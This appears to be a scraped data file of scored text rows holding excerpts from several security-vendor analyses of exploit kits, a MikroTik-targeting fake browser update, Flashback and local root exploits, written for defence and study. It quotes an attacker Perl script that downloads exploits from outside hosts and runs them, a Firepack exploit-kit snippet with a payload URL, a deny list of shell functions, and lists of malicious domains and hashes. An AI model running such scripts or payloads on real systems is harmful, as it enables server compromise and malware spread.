This information gives us a better impression of the infrastructure and management used to control user web traffic for the purpose of redirecting it to malicious sites.
4.3 URL structure
The URL structure used for the various components of a drive-by attack can often be useful in identifying malicious activity in amongst user web traffic. Historically, certain exploit kits have used predictable URL structure for different components, making it easier for security providers to detect and block content. Some examples from the Nuclear and Blackhole exploit kits include:",0.022091407407573205
"Timestamps as filenames.
Hashes used in file and folder names.
Characteristic text in the query part of URLs.",0.012464511011980761
"Similar weakness were present in early versions of Angler as well, but the kit has evolved significantly since then, taking steps to remove any Achilles heel that might have been easy to spot in the URLs used for its various components.
5 Payloads
The final section of this article aims to provide an overview of the actual malware being installed through Angler. To investigate this, we analyzed payloads for a 4-week period during April 2015.
As you can see, all the payloads collected during this period were delivered by exploits against Internet Explorer (59%) or Flash (41%):
Figure 23: Exploits used to deliver Angler payloads during April 2015.
This matches our data for recent Angler landing pages, where we have not seen exploits against Silverlight or Java. However, these results are determined as much by the victims’ computer configurations as by Angler itself, because Angler avoids trying exploits against components that are not installed.
The malware families installed in these drive-by downloads were as follows:
Figure 24: Malware families installed by Angler in April 2015.
Clearly there is a ransomware focus here – the names tagged with asterisks are ransomware families, and account for more than 50% of the malware attacks. The most common ransomware was Teslacrypt.
6 Summary
In this research article we have taken a top-to-bottom look at the Angler exploit kit, highlighting some of the methods used to ramp up traffic to Angler-infected web pages.
Understanding this behavior end-to-end is vital when providing protection. Angler attempts to evade detection at every level. To evade reputation filtering it switches hostnames and IP numbers rapidly, as well as using domain shadowing to piggyback on legitimate domains. To evade content detection, the components involved in Angler are dynamically generated for each potential victim, using a variety of encoding and encryption techniques. Finally, Angler uses obfuscation and anti-sandbox tricks to frustrate the collection and analysis of samples.
As illustrated above, Angler has risen above its competitors in recent months. This could be down to many factors: higher traffic to Angler-infected pages; exploits with a better hit-rate in delivering malware; slicker marketing amongst the criminal fraternity; more attractive pricing – in other words, good returns for the criminals who are buying “pay-per-install” malware services from the team behind Angler.
One thing is clear: Angler has a serious impact on anyone browsing the web today.
7 Acknowledgments
We commend the work done by everyone in the security community to track exploit kit activity. In preparing this article, however, we would like to give individual hat-tips to @kafeine and @EKwatcher.
Thanks also to Richard Cohen and Andrew O’Donnell of SophosLabs for their work on the shellcode components.
Thanks to Ben Taylor, Sion Lloyd and Roy Arends of Nominet for their insights into DNS domain shadowing.",0.01747257877020081
"DEEP LEARNING FOR DEEPER CYBERSECURITY  Watch Video
",0.011176153783902576
"Fake browser update seeks to compromise more MikroTik routers
This blog post was authored by @hasherezade and Jérôme Segura.
MikroTik, a Latvian company that makes routers and ISP wireless systems, has been dealing with several vulnerabilities affecting its products’ operating system over the past few months. Ever since a critical flaw in RouterOS was identified in late April 2018, attacks have been going on at an alarming rate, made worse when a newly-found exploitation technique for CVE-2018-14847 was identified.
The problem is that a large number of MikroTik routers remain unpatched and are prey for automated attacks, despite security fixes made available by the vendor. Criminals were quick to leverage Proof of Concept code to compromise hundreds of thousands of devices in a short time frame. Last summer, researchers at SpiderLabs discovered what was perhaps the biggest malicious Coinhive campaign via hacked MikroTik devices, which has evolved into a much wider problem now.
With this latest trick, users behind compromised routers are served a fake browser update page. When they run this malicious update, it unpacks code onto their computer that scans the Internet for other vulnerable routers and tries to exploit them.
Suspicious browser update
Security researcher @VriesHd first spotted a new campaign attempting to further compromise vulnerable routers using a typical social engineering technique. Internet providers that operate infected MikroTik routers will serve this malicious redirect about an “old version of the browser” to their end users:",0.013794508809497175
"According to a search via Censys, there are about 11,000 compromised MikroTik devices hosting this fake download page:",0.012241927821306398
"The alleged browser update is suspiciously downloaded from an FTP server, as seen below:",0.01119592532792324
"Interestingly, this IP address is also listed as a free and open web proxy. Proxies are often used by those who wish to bypass certain country limitations (i.e. watching the American version of Netflix if you are not in the US) or simply as a way to mask their IP address.",0.014378380986136308
"Payload analysis
Behavioral analysis
The payload follows the theme of pretending to be an installer named upd_browser.",0.013195773255905707
"When we deploy it, it pops up an error:",0.007521984413969007
"However, if we capture the network traffic, we can see that in the background it scans various IP addresses, trying to connect on port 8291 (a default port for managing MicroTik routers via Winbox application):",0.0076457829293765656
"Unpacking
The dropped payload is a relatively big executable (7.25 MB) with a huge overlay. The sections’ headers and their visualizations are given below:",0.01376296553091605
"As we can recognize by looking at the sections names, it comes packed by a popular, simple packer: UPX. The size of overlay suggests that there is something more to be extracted. After further examination, we find out that it unpacks a Python DLL and other related files into the %TEMP% folder, and then loads them. At this point, it is easy to guess that this EXE is in reality a wrapped Python script. We can unpack it following the same procedure as the one described here.",0.012507131668675564
"The Entry Point is in the script named upd_browser. After decompiling and following the scripts, we find out that the malware’s core consists of two Python scripts: upd_browser.py and ups.py.
Inside the scripts
The main function of the module is pretty simple:",0.013375462614431566
"As we can see, the error pop-up is hardcoded: It does not alert about any actual error, but is used as a decoy.
After that, the malware logs the IP address of the victim by querying a hardcoded address of a tracker made using a legitimate service, IP Logger. The tracker takes the form of a one pixel–sized image:",0.010819285485858754
"Later, this address is queried repeatedly in a defined time interval.
The most important actions are performed in the function named “scan” that is deployed in several parallel threads (the maximum number of threads is defined as thmax = 600). The function “scan” generates pseudo-random IP addresses and tries to connect to each of them on the aforementioned port 8291. When the attempt of connecting is successful, it tries another connection, this time on a random port from a range of 56778 to 56887. When this one fails, it proceeds with the exploitation:",0.012525947282046923
The function “poc” is meant to infect the router using known vulnerabilities. It starts by attempting to retrieve credentials leveraging the path traversal vulnerability (CVE-2018-14847):,0.005678109345401139
"The user.dat file is expected to be in M2 format, so the script comes with a built-in parser (function load_file):",0.008288695174428318
"If retrieving the password from user.dat file is successful, it decodes the credentials and uses them to create a backdoor: an account with a randomly-generated password. It also sets a scheduled task to be executed by the router.
The script that is set in the scheduler is generated from a hardcoded template (cleaned version available here). Its role is to manipulate the router’s settings and set up an error page loading a CoinHive miner.
The error page can be dropped in two locations: “webproxy/error.html” or “flash/webproxy/error.html” .",0.008988080793073228
"Such a page is displayed to users whenever they try to view a URL to which the access is denied. But the malicious script configured in the router in such a way that basically any HTTP request leads to the error. Yet, the error page is crafted to spoof the original traffic, displaying the requested page as an iframe. So, users may browse most of the web as usual, without noticing the change. Example:",0.013180518663661211
"The CoinHive miner is embedded, so during the time this time their machines are used for mining purposes.
Mitigations
MikroTik users are urged to patch their routers as soon as possible and should assume that their authentication credentials have been compromised if they are running an outdated version. MikroTik’s download page explains how to perform an upgrade to RouterOS.
A blog post from the company about CVE-2018-14847 also advises users to restrict access to Winbox via the Firewall and make sure the configuration file is clean (this is usually where scripts or proxies would be injected).
Awareness that these vulnerabilities exist and are easy to exploit is important considering that patching a router is not something many people are used to doing. However, in many cases users will not be able to do so unless their Internet Service Provider does it for them upstream.
With this latest social engineering scheme, we saw how criminals are trying to infect regular users and leverage their computer to scan the Internet for vulnerable routers. This technique is clever because such an effort requires time and resources to be efficient.
Malwarebytes business customers and Premium consumer users are protected from this threat, as our anti-malware engine detects and blocks this fake browser update in real time:
Malwarebytes Endpoint Protection blocks the malicious executable disguised as a browser update.
Indicators of compromise
Sample hash
57EB8C673FC6A351B8C15310E507233860876BA813ED6AC633E9AF329A0BBAA0
Coinhive site keys
oiKAGEslcNfjfgxTMrxKGMJvh436ypIM
5zHUikiwJT4MLzQ9PLbU11gEz8TLCcYx
5ROof564mEBQsYzCqee0M2LplLBEApCv
qKoXV8jXlcUaIt0LGcMJIHw7yLJEyyVO
ZsyeL0FvutbhhdLTVEYe3WOnyd3BU1fK
ByMzv397Mzjcm4Tvr3dOzD6toK0LOqgf
joy1MQSiGgGHos78FarfEGIuM5Ig7l8h
ryZ1Dl4QYuDlQBMchMFviBXPL1E1bbGs
jh0GD0ZETDOfypDbwjTNWXWIuvUlwtsF
BcdFFhSoV7WkHiz9nLmIbHgil0BHI0Ma
",0.011381136940258663
Is CVE-2012-0507 the best toolkit to exploit Mac OS X?,0.014776802244215292
The recent advent of flashback malware that includes exploit code for CVE-2012-0507 has been creating waves and quickly adopted by various other attackers as Websense® Security Labs™ has shown. This blog post detail some of the aspects of CVE-2012-0507 and how this exploit has been used in the wild.,0.0099425833928527
The Java code first starts with the excerpt below:,0.009430126870077493
"The string ""sobj"" contains a stream of characters that trigger the vulnerability and force Java to render something which it usually wouldn't be allowed to. The string ""8BCA ..."" is obfuscated with an XOR key of 0x27 shown below:",0.008856671407174388
"After this string is de-obfuscated, it looks something like the image below:",0.01331441776911424
"We compared the exploit code used in the flashback campaign (above) with another instance in the wild that surfaced recently. Apparently, the attacker is using the exploit code provided by the metasploit framework.",0.01225722717161748
"The only difference between the flashback exploit code and the one used by metasploit is the bytecode array, where one is a signed byte array while the other is unsigned, as revealed below:",0.011553369912426281
"In our flashback sample, the string that triggers the vulnerability is ""XOR-ed"" with 0x27, while the string seen in the metasploit sample uses a signed byte array.",0.008935692757725766
"Lastly, the payload used by the flashback malware is a dropped Mach-O binary executable, while the metasploit exploit opens a listening TCP port shell pipe depending on what operating system the victim is on (This highlights the beauty of a design flaw as opposed to a vulnerability that corrupts memory). The code excerpt is shown below:",0.010488076689431303
"Websense security solutions protect users from these kinds of exploits.
",0.016137828778937213
From a Site Compromise to Full Root Access – Local Root Exploits – Part II,0.009609470534625908
"When an attacker manages to compromise and get access to a website, they won’t likely stop there, they will aim to gain full root (admin) access to the entire server. If there are more websites hosted on the server being attacked, It is likely they will attempt to compromise every single one of them.
How can an attacker escalate their privileges? How can they go from FTP-only access to getting root on the server? In this series of articles we will show some techniques that attackers are using to go from confined FTP/web access, to full root level access on a server.",0.01487204577096779
"Part I – Symlinks to Root
Part II – Local exploits",0.00858640775052566
"Local Root Exploits
If you missed Part I from the series, we recommend you go there and read it first. Part I shows how an attacker who is confined to an FTP or web account can increase their access, and look around the whole server, including viewing passwords and configuration files.
Sure, this still does not give them full root (admin) access. Well, if they are lucky enough to find a root password in any of the configurations it would, but that doesn’t always happen.
Don’t be fooled though, what they really want is root (uid 0), the idea is to increase their privileges from normal user to root. To do this they need to find a vulnerability that allows them to escalate their privileges.
These vulnerabilities are easy to find. Very easy in fact. In the public exploit database, we can see at least 3 local root exploits against Linux released in the month of May:",0.014527551100295355
"2013-05-14 – Linux PERF_EVENTS – Local Root Exploit
2013-05-14 – Linux Kernel open-time Capability file_ns_capable() Privilege Escalation
2013-05-01 – sudo v1.8.0-1.8.3p1 (sudo_debug) – Root Exploit + glibc FORTIFY_SOURCE Bypass",0.012117683375374111
"If the kernel/system is not always updated, the attacker could leverage those bugs to get root access.
Automating the local Root Exploits
Since those local vulnerabilities are so common, the attackers just automate their work to try them all. On a compromised server we found this script:",0.01340041856930796
"#! /usr/bin/perl
# Exploit tools v2.0 coded by iskorpitx (Turkish Hacker)
# linux serverlerde gecerlidir
# by iskorpitx
{
system(""rm *.txt”);
system(""wget http://www.euromedalex.org/profiles/a.c”);
system(""gcc a.c -o ab”);
system(""chmod 777 ab”);
system(""./ab”);
system(""./id”);
system(""wget http://www.euromedalex.org/profiles/a”);
system(""chmod 777 a”);
system(""./a”);
system(""id”);
system(""rm ab.txt”);
system(""wget www.cuia.net/media/ab.txt”);
system(""wget www.kassfm.co.ke/cache/15704.c”);
system(""gcc 15704.c -o 1704″);
system(""chmod 777 1704″);
system(""./1704″);
system(""id”);
.. many more entries ..",0.014110868435218471
"This script downloads multiple exploits and tries all of them in sequence. The first one tries the sudo format string exploit, the other is a Linux Kernel <= 2.6.37 local privilege escalation and so on.",0.008695120600108797
"You can't just have an almost fully patched system. If one vulnerability is missed, the attacker get root.",0.009846208462111927
"0-day Exploits
0-day exploits are probably the scariest to deal with, and are common with local vulnerabilities. The recent CVE-2013-2094 is an example which was public before there were patches available. Another concern is that kernel-level patches require a restart and most admins don’t like to restart their servers often. Even a patched server that didn’t get restarted it still vulnerable.
Protecting against local escalations
The most important thing an admin can do is to always keep their servers updated. If all known vulnerabilities are patched, the attackers won’t have much to work with. We also recommend (whenever possible) to disable shell execution for the web users. For example, you can modify your php.ini to prevent functions like system, exec, and popen from running. This make it harder for attackers to run their shells and commands:",0.013570583877697051
"disable_functions=exec,passthru,shell_exec,system,proc_open,popen",0.011790426604925353
"Another good option is to put Apache (or whatever web server you are running) under a chroot jail with a minimal set of commands available.
Do you have recommendations? How do you lock down your server in an effort to thwart local attacks?
",0.009993644765381782
"We’ve intercepted an ongoing malicious campaign, relying on injected/embedded iFrames at Web sites acting as intermediaries for a successful client-side exploits to take place. Let’s dissect the campaign, expose the malicious domains portfolio/infrastructure it relies on, as well as directly connect it with historical malicious activity, in this particular case, a social engineering campaign pushing fake browser updates.",0.011028449282288633
Sample screenshot of the script identifying the client’s Flash Player version:,0.008473583663629936
"iFrame URL: mexstat210.ru – 88.198.7.48
Known to have responsed to the same IP (88.198.7.48) are also the following malicious domains:
alson.info – Email: zexpay@gmail.com
autosloans.biz
bank7.net
bestfriendsfinder.net
blingpurse.com
demserv.net
distantnews.biz
distantnews.com
distantnews.pw
free-vpn.co.uk
goodloads.oufk.info
itmagnate.org
loansauto.biz
loansautos.com
loansbiz.net
mexstat210.ru
mexstat260.pw
mexstat480.pw
online-job.info
russianshoping.net
vilestube.com
updbrowser.com
allonlineworkathome.info
Sample detection rate for the malicious script: MD5: efcaac14b8eea9b3c42deffb42d59ac5 – detected by 30 out of 43 antivirus scanners as Trojan-Downloader.JS.Expack.sn; Trojan:JS/Iframe.BS
The following malicious MD5s are also known to have been hosted on the same IP (88.198.7.48):
bank7.net/chrome/ChromeUpdate.exe – MD5: 7b3d9e48deac8d0b33f6fc4235361cbd
bank7.net/ie/IEUpdate.exe – MD5: 7b3d9e48deac8d0b33f6fc4235361cbd
bank7.net/firefox/FirefoxUpdate.exe – MD5: 7b3d9e48deac8d0b33f6fc4235361cbd
setexserv.com/zort.exe – MD5: ed5c71023a505bd82f5709bfb262e701
ztxserv.biz/chrome/ChromeUpdate.exe – MD5: 2e899f619c9582e79621912524a0bafb
Client-side exploits serving URL: urkqpv.chinesenewyeartrendy.biz:39031/57e2a1b744927e0446aef3364b7554d2.html – 198.50.225.114
Domain name reconnaissance: chinesenewyeartrendy.biz – 46.105.166.96 known to have responded to the same IP is also appearancemanager.biz
Detection rates for the dropped PDF exploits:
MD5: 77cd239509c0c5ca6f52c38a23b505f3 – detected by 3 out of 48 antivirus scanners as Heuristic.BehavesLike.PDF.Exploit-CRT.F; HEUR_PDFJS.STREM
MD5: 131e53c40efddfc58f5ac78c7854bc73 – detected by 3 out of 48 antivirus scanners as Exploit.Script.Heuristic-pdf.gutws; Heuristic.BehavesLike.PDF.Exploit-CRT.F
Both malicious PDF files exploit CVE-2010-0188 which also phone back to : urkqpv.chinesenewyeartrendy.biz:39031/f/1381405800/1381405863/ce504b9214abf8db6ce3d7276b7badbb/7770e5aab4389e4e2faf75514bed926e/6
It gets even more interesting, taking into consideration the fact that the iFrame injected/embedded URL includes a secondary iFrame pointing to a, surprise, surprise, Traffic Exchange network. Not surprisingly, we also identified a related threat that is currently using the same infrastructure as the official Web site of the Traffic Exchange.",0.011958648807571581
"Secondary iFrame: mxdistant.com – 213.239.231.141
Known to have responded to the same IP in the past are also the following malicious domains:
photosgram.com
worldtraff.ru
worldtraffic.biz
Which inevitably leads us to photosgram.com/gallery.exe – MD5: 961dba6cf73d24181634321e90323577 – detected by 13 out of 48 antivirus scanners as TROJ_GEN.R0CBOH0I713; Artemis!961DBA6CF73D.
Once executed, it phones back to anyplace-gateway.info – 76.72.165.63 – info@remote-control-pc.com
The following MD5s are also known to have phoned back to the same IP in the past:
MD5: c4fb386b785e8c337e378d2c318c18c7
MD5: db872312b12f089cc525068b8c67baaf
MD5: 5457197c011263db0820fc6b6788b45c
MD5: 217745fadde1d42cc31ba20b4eb601d3
MD5: ba11bb7704cc36ad55b22c00080b6d39
MD5: 70d821fa0b6bdf30221cce9e3ad40727
MD5: 12d1436481c6a19c05a12578249683b2
Moreover, updbrowser.com is also directly related to worldtraff.ru, as it used to push fake browser updates, similar to the MD5s at bank7.net and ztxserv.biz.
Webroot SecureAnywhere users are proactively protected from these threats.
",0.011864039426487283
"Exploit kit explosion – part two: vectors of attack
2010-05-01",0.008317132359097812
"Mark Davis
Editor:
Helen",0.009310743685337908
"Martin
Abstract
After introducing a multitude of exploit frameworks used in drive-by browser-based attacks in his last article, this month Mark Davis details the functionality of frameworks, focusing on attack vectors (exploits) and counter-intelligence efforts.
Copyright © 2010 Virus Bulletin",0.012771717320183451
"Last month I introduced a multitude of exploit frameworks used in drive-by browser-based attacks (see VB, April 2010, p.21). Most are programmed in PHP and SQL, selling for a few hundred dollars or more in a competitive criminal market. Common exploit frameworks include Eleonore, Fragus, Neosploit, Yes! and more. The aim of this follow-up article is to detail the functionality of frameworks, focusing on attack vectors (exploits) and counter-intelligence efforts.
It should be noted that analysis of exploit frameworks is more of an art than a science. Incomplete data sets, demo kits and behavioural testing frequently fail to properly identify all the attack vectors of a given kit. Slang terms and/or misidentification of exploit vectors and files are commonly found when referencing open-source intelligence documentation for such frameworks. Additionally, the development and distribution of these threats is dynamic, with the threats constantly being upgraded and/or deployed privately, resulting in different configurations and capabilities of the same attack kit in different incidents. In other situations CVE numbers are deprecated, CLSIDs are not specific enough, and/or exploited vulnerabilities exist in potentially unwanted applications such as Zango adware.
It is difficult to properly qualify each attack vector and exploit in a lab. Every effort has been made to scan all files, analyse source code, and correlate back to exploit strings, CVEs and other attack data for each exploit framework attack vector reported on in this document. The author welcomes feedback and additional data to continue to research and report on such threats as they emerge (please contact [email protected]).",0.012760794284597532
"Exploits
Before diving into exploits, what is your own theory about the prevalence of the various exploit vectors used in exploit frameworks? Do you believe kits contain as many exploits as possible? Or perhaps an exploit framework only includes the most recent or zero-day attack vectors? Do kits commonly beg, borrow, and steal so that most kits contain the same exploits? What are the most targeted vectors – Internet Explorer, Firefox, Adobe Reader, Flash, Java and others? The results of a large-scale aggregate review of exploit frameworks in the wild may surprise you. The following are the findings after an analysis of about two dozen exploit frameworks.
Exploit kits actually contain a wide range of diverse exploits impacting many different products. Some, such as Neosploit, include exploitation of vulnerabilities not included in other kits (Neosploit is alone in containing ‘Buffer Overflow in the GomManager (GomWeb Control) ActiveX control in GomWeb3.dll 1.0.0.12 in Gretech Online Movie Player’ (CVE-2007-5779)). In reviewing a comprehensive list of attack vectors the data shown in Table 1 emerged, showing the exploit vectors for all kits analysed in the wild to date.
Vulnerability
CVE
Microsoft Internet Explorer 7 iepeers.dll Use After Free Vulnerability
CVE-2010-0806
Microsoft Internet Explorer 8 Use After Free Vulnerability
CVE-2010-0249
Adobe Reader 9.3 Acroform.api TIFF Image Handler Stack-Based Buffer Overflow Vulnerability
CVE-2010-0188
Adobe Acrobat 9.2 newPlayer() Improper Initialization Vulnerability
CVE-2009-4324
Sun Java Runtime Environment 6 Update 16 getSoundbank() Stack-Based Buffer Overflow Vulnerability
CVE-2009-3867
Adobe Acrobat 9.1.3 U3D CLODProgressiveMeshContinuation Array Index Input Validation
CVE-2009-2990
Mozilla Firefox 3.5 (Font Tags) Remote Buffer Overflow
CVE-2009-2477
Microsoft Windows Server 2008 Service Pack 2 Telnet Server Unspecified Vulnerability
CVE-2009-1930
Flash 10, Adobe Reader & Acrobat
CVE-2009-1862
Adobe Reader 9.1 getAnnots() Function Buffer Overflow Vulnerability
CVE-2009-1492
ActiveX Control vulnerability is MS Office Web Components
CVE-2009-1136
Adobe Reader ‘Collab.getIcon()’ Stack-Based Buffer Overflow Vulnerability
CVE-2009-0927
Uninitialized Memory Corruption Vulnerability
CVE-2009-0075
Sun Java Runtime Environment 6 Update 10 Deserializing Calendar Objects Unspecified Vulnerability
CVE-2008-5353
MS Internet Explorer XML Parsing Vulnerability
CVE-2008-4844
Windows Media Encoder wmex.dll ActiveX Control
CVE-2008-3008
Adobe Reader 8.1.2 ‘util.printf’ Stack-Based Buffer Overflow Vulnerability
CVE-2008-2992
Microsoft Access 2003 Snapshot Viewer ActiveX Control Unspecified Vulnerability
CVE-2008-2463
Aurigma ImageUploader ActiveX Control Stack-Based Buffer Overflows
CVE-2008-1490
CA Multiple Products DSM ListCtrl ActiveX Control Buffer Overflow Vulnerability
CVE-2008-1472
Adobe Reader 8.1.1 ‘Collab.collectEmailInfo()’ Stack-Based Buffer Overflow Vulnerability
CVE-2008-0655
Yahoo! Music Jukebox YMP Datagrid ActiveX Control Stack Buffer Overflows
CVE-2008-0623
Microsoft Video (DirectShow) ActiveX Control Vulnerability
CVE-2008-0015
Stack-Based Buffer Overflow in AOL AOLMediaPlaybackControl
CVE-2007-6250
QuickTime RTSP Response Vulnerability
CVE-2007-6166
Buffer Overflow in the GomManager ActiveX Control in GomWeb3.dll 1.0.0.12 in Gretech Online Movie Player
CVE-2007-5779
Adobe Reader 8.1.1 JavaScript Argument-Handling Buffer-Overflow Vulnerability
CVE-2007-5659
RealPlayer Stack-Based Buffer Overflow in the Database Component in MPAMedia.dll
CVE-2007-5601
Opera Web Browser Invalid Pointer Remote Code Execution Vulnerability
CVE-2007-4367
Yahoo! Webcam view Utilities ActiveX Control Vulnerable to Arbitrary Code Execution
CVE-2007-3147, CVE-2007-3148
Zenturi ProgramChecker ActiveX Remote Buffer Overflow
CVE-2007-2987
WordOCX ActiveX control in WordViewer.ocx 3.2.0.5
CVE-2007-2496
Adobe Inc. Flash Player 9.0.115.0 Flash File NULL Pointer Dereference Vulnerability
CVE-2007-0071
Microsoft Windows Animated Cursor Remote Code Execution Vulnerability
CVE-2007-0038
Vulnerability in Vector Markup Language Could Allow Remote Code Execution
CVE-2007-0024
Buffer Overflow in Apple QuickTime 7.1.3
CVE-2007-0015
WinZip FileView ActiveX Controls CreateNewFolderFromName() Method Buffer Overflow
CVE-2006-6884
Adobe Acrobat AcroPDF ActiveX Control Fails to Properly Handle Malformed Input
CVE-2006-6027
AOL SuperBuddy ActiveX Control ‘LinkSBIcons()’ Code Execution Vulnerability
CVE-2006-5820
Vulnerability in Microsoft XML Core Services Could Allow Remote Code Execution
CVE-2006-5745
Multiple Heap-Based Buffer Overflows in AOL Nullsoft WinAmp Before 5.31
CVE-2006-5567
Vulnerability in Microsoft Data Access Components Allows Code Execution
CVE-2006-5559
DirectAnimation ActiveX Controls Memory Corruption Vulnerabilities
CVE-2006-4777
Vulnerability in Visual Studio 2005 Could Allow Remote Code Execution
CVE-2006-4704
WebViewFolderIcon
CVE-2006-3730
Mozilla Firefox JavaScript Navigator Object Remote Code Execution Vulnerability
CVE-2006-3677
Vulnerability in Microsoft Management Console Could Allow Remote Code Execution
CVE-2006-3643
Microsoft Windows Media Player Plugin Buffer Overflow Vulnerability
CVE-2006-0005
Microsoft Windows Server 2003 Service Pack 1 RDS.Dataspace ActiveX Control Access Control Vulnerability
CVE-2006-0003
MSMicrosoft ‘msdds.dll’ COM Object Lets Remote Users Execute Arbitrary Code COM exploits – Generic Code Execution for IE ActiveX objects RDS.DataControl, WMIScriptUtils, and more
CVE-2005-2127
Vulnerability in Cursor and Icon Format Handling Could Allow Remote Code Execution
CVE-2004-1049
Integer Overflow in Apple QuickTime
CVE-2004-0431
Java Bytecode Verifier
CVE-2003-0111
Foxit Reader 3.0. PDF Exploit
N/A
SPL Amaya 11
N/A
Windows Media Player 11 ActiveX launchURL() Files Download
N/A
DownloadAndExec() Zango Adware Exploits
N/A
Table 1. Exploit vectors for all kits analysed in the wild to date.
Exploit frameworks tend not to share such vectors. Unlike ‘the year of the bot’ in 2004, when the source code for Phatbot, MyDoom and other high-profile malicious programs was made available in the underground and shared widely amongst threats, exploits are held very tightly by criminals in 2010. This is likely for competitive advantage. One theory behind the release of various source codes in 2004 was to defer culpability, with the thought that if someone got arrested they wouldn’t be the only one to be in possession of the source code for a powerful threat, or they could claim that a trojan uploaded it to their computer. In 2010 the very clear operating procedure for criminals is to undercut a mature market to develop goods and services for financial gain.
The most commonly exploited vulnerabilities amongst multiple kits are listed below:
Browser-based:
Uninitialized Memory Corruption Vulnerability
Mozilla Firefox 3.5 (Font Tags) Remote Buffer Overflow
Windows/Office:
Microsoft Windows Server 2003 Service Pack 1 RDS.Dataspace ActiveX Control Access Control Vulnerability
Microsoft Windows Server 2008 Service Pack 2 Telnet Server Unspecified Vulnerability
Microsoft Video (DirectShow) ActiveX Control vulnerability
Microsoft Access 2003 Snapshot Viewer ActiveX Control Unspecified Vulnerability
ActiveX Control Vulnerability in MS Office Web Components
Microsoft Windows Media Player Plug-in Buffer Overflow Vulnerability
Adobe (PDF/Flash):
Adobe Inc. Flash Player 9.0.115.0 Flash File NULL Pointer Dereference Vulnerability
Adobe Reader 8.1.1 ‘Collab.collectEmailInfo()’ Stack-Based Buffer Overflow Vulnerability
Adobe Reader ‘Collab.getIcon()’ Stack-Based Buffer Overflow Vulnerability
Adobe Reader 8.1.2 ‘util.printf’ Stack-Based Buffer Overflow Vulnerability
QuickTime:
Buffer Overflow in Apple QuickTime 7.1.3
Java:
Sun Java Runtime Environment 6 Update 10 Deserializing Calendar Objects Unspecified Vulnerability
The list of the most common vectors reveals a divergence of attack vectors. Attacks are not just focused on Adobe Reader (PDF) files but also on Flash, QuickTime, Java, Windows, Office and browser-based vectors. Diversity is one of the keys to maximizing exploitation and driving up sales of an exploit framework. Average exploitation on kits is around 20 per cent if they are current and well distributed for targeted victims.
Fragus is a popular exploit kit seen in the wild in 2009 and 2010. Figure 1 shows a small number of infections at the time of anlaysis. Of those infections, MDAC ranks at the top of the list, with PDF ranking second highest. The highest percentage of effective attacks is aolwinamp with 100% success, while MDAC has only 37.5% success. This suggests that, although MDAC is not as successful as other exploits, it is still being used against a target audience that may be using older versions of Internet Explorer and/or systems that are not fully patched or legal. Other exploits are often a backup for kit authors as they seek to attack with older scripts and then use more recent ones later. Other kits have a priority system that can easily be managed to prioritize the way exploits are launched, as seen in the Unique Pack example shown in Figure 2.
Figure 1. Fragus statistics
Figure 2. Unique Pack
Leading exploit frameworks are rapidly upgraded to include new attack vectors. For example, the Java deserializing issue was implemented in several top kits within 30 days of it first being used by a kit in the wild. This is likely not due to it being shared amongst kit creators, but to the creators of the top kits competing with one another for market share within their industry.
The type of exploit is less of an issue than several years ago when buffer overflows were the common vector of exploitation. Vulnerabilities exploited by kits range from buffer overflows to memory corruption, design errors, input validation, boundary condition errors and more. What matters is that the vulnerability is reliable and fits well within the browser-based drive-by exploitation model. As such, exploitation has matured from purely browser-based vulnerabilities to targeting third-party applications integrated into browsers such as Adobe Reader (PDF), Java, Flash and similar tools. Neosploit is a prime example of this, implementing the ‘Aurigma ImageUploader ActiveX Control Stack-Based Buffer Overflows’ exploit to take advantage of a vulnerability related to software for Facebook, MySpace and similar social networking sites in 2008. By developing such exploits within a kit, its creators gained an exclusive edge over other kits, were able to target a specific audience of interest, and increase the exploitation success rate.
The average exploit framework exploits eight vulnerabilities. The more comprehensive frameworks are as follows: Eleonore, Fragus, YES!, Fiesta, Shamans Dream Pack, Unique Pack, Liberty and Papka Pack (these ranging from 11 to 17 exploits per kit).
One final trend is the avoidance of legacy exploit vectors. Legacy exploit vectors are commonly easily spotted by IDS/IPS solutions and are more likely to lead to detection and shutdown/blacklisting of an exploit framework domain or IP. As a result, older vulnerabilities are not used in or are retired from exploit frameworks. With that said, can you guess which vulnerability is the most common older vector used in multiple kits? Believe it or not, it’s the infamous MDAC vulnerability from 2006 (CVE-2006-0003). This is likely due to the raving success claimed by many criminals when using this vulnerability. It is likely that newer vulnerabilities considered of high value to criminals will also sustain longevity in exploit framework kits, most notably the recent Java deserialization vulnerability (CVE-2008-5353).",0.01349103409487018
"Counter-intelligence
Criminals are professionals too and they have implemented a wide range of counter-intelligence capabilities. Specific to exploit frameworks there is now intelligence behind tracking and responding to specific IPs, performing a staged attack, implementing obfuscation, randomization and encryption, anti-sandbox features, and blacklist notifications. While this is not a comprehensive list, these are the most common counter-intelligence features seen in the wild in 2010.",0.013743194232090916
"IP management
Exploit frameworks always include some sort of web-based exploitation statistics. To track geographic spread, the IP addresses of infected computers are captured and correlated with a GeoIP database. The exploit framework stores this information in a database along with a country code for displaying statistics to the criminal.
Part of IP management in 2010 includes one-time IP payload management. If an IP is recognized as already having visited a site, the exploit framework may do something different with that session rather than launch exploits against the computer. In many cases a redirection to a common site like www.google.com is performed when a site is visited for the second time.
More recently exploit frameworks have begun to collect and archive historical intelligence against banned IPs. This is similar to work done via avtracker.info [1]. The concept is simple: track the IPs that regularly visit a hostile site to block security researchers and/or automated analysis of an exploit framework. Over a period of time this forces security researchers to proxy or otherwise modify the visiting IP of a computer investigating an exploit framework.
In some cases exploit frameworks may also present fake error messages. For example, Fragus presents what appears to be a 404 error page when in fact it is silently exploiting in the background, using heavily obfuscated JavaScript.",0.013226446979722195
"Staged attacks
Attacks are sometimes performed only after triage of a visiting computer. It is now common for exploit frameworks to collect metrics on the OS, browser, referral (the last domain visited by the browser), whether Java is used, and more. This information is then used conditionally by some kits to stage attacks. This involves a simple hierarchy of conditional statements, such as numbering the sequence in which to launch exploits. Another way to manage this is shown in the Firepack kit index.php script where it looks for IE 6, and if found, attempts to exploit it. If IE 6 is not found, the user is directed to error.php:
if ($brow==”MSIE”)
{
if ($ver==”6”)
{
msie_stat();
include(“exp/msie.php”);
}
}",0.009013632008384898
"else
{
other_stat();
include ‘error.php’; exit;
//header(“location: $redir”);
}",0.018079399192865275
"Obfuscation, randomization and encryption
Msie.php, used in the above Firepack example, is also an excellent example of obfuscation, randomization and encryption used in an exploit framework attack. In this case msie.php begins with a payload URL and a randomization function:
function smc() {
$b = ‘<Script Language=”JavaScript”>
var url1=”http://k0d.biz/sfile.exe”;
var rndmz = Math.round(Math.random()*99999);
The exploit begins several lines later where JavaScript is used to obfuscate the CLSID to avoid easy identification by IDS/IPS and anti-virus software:
function buff() {
var z_obj = document.createElement(b5+b6);
z_obj.setAttribute(“id”,”z_obj”);
